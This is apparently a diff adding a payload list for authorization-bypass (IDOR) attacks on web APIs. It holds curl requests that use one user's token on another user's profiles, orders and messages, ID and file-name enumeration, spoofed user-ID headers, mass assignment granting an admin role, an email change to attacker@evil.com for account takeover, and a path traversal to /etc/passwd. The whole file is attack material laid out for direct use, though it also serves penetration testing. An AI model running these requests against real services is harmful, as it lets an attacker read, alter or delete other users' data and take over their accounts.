@@ -1,0 +1,41 @@
+curl -s -H "Authorization: Bearer {token_user_A}" https://target.com/api/users/{id_user_B}/profile
+curl -s -H "Authorization: Bearer {token_user_A}" https://target.com/api/users/{id_user_B}/settings
+curl -s -H "Authorization: Bearer {token_user_A}" https://target.com/api/orders/{order_id_user_B}
+curl -s -H "Authorization: Bearer {token_user_A}" https://target.com/api/invoices/{invoice_id_user_B}
+curl -s -H "Authorization: Bearer {token_user_A}" https://target.com/api/messages/{message_id_user_B}
+curl -s -H "Authorization: Bearer {token_user_A}" https://target.com/api/documents/{doc_id_user_B}
+curl -s -H "Authorization: Bearer {token_user_A}" https://target.com/api/accounts/{account_id_user_B}
+GET /api/users/1 → try /api/users/2
+GET /api/users/me → try /api/users/1
+GET /api/profile?user_id=1 → try user_id=2
+GET /api/resource?id=1 → try id=0, id=-1, id=99999
+POST /api/update {"user_id": 1, "email": "x"} → change user_id to victim's ID
+PUT /api/users/1/email → try /api/users/2/email
+DELETE /api/posts/1 → try DELETE /api/posts/{other_user_post_id}
+GET /api/export?report_id=1 → try report_id=2
+GET /download?file_id=abc123 → enumerate/predict file IDs
+GET /api/v1/users/{uuid} → try other UUIDs
+GET /api/invoices/{guid} → try GUIDs from other endpoints that leak them
+X-User-ID: {victim_id}
+X-Account-ID: {victim_account_id}
+X-Org-ID: {victim_org_id}
+{"userId": "{victim_id}"}
+{"accountId": "{victim_account_id}"}
+{"id": "{victim_id}", "role": "admin"}
+PATCH /api/users/{victim_id} {"email": "attacker@evil.com"}
+POST /api/admin/users/{victim_id}/reset-password
+GET /api/users?filter[id]={victim_id}
+GET /api/users?user_id={victim_id}&user_id={own_id}
+GET /api/resource/{id} with no Authorization header
+GET /api/resource/{id} with different tenant's token
+GET /api/v2/users/{id} when v1 has auth but v2 does not
+/api/users/1/../2
+/api/users/1%2F..%2F2
+GET /api/files/{filename} with ../../../etc/passwd as filename
+GET /export/users/1.csv → try 2.csv
+GET /api/users/1.json → try 2.json
+GET /photos/user1/avatar.jpg → try /photos/user2/avatar.jpg
+POST /api/messages {"to": "{victim_id}", "from": "{attacker_id}"} → swap from to victim's ID
+PUT /api/orders/{order_id} {"status": "completed"} with victim's order ID
+GET /api/admin/users → access without admin role
+GET /api/internal/config → access as regular user
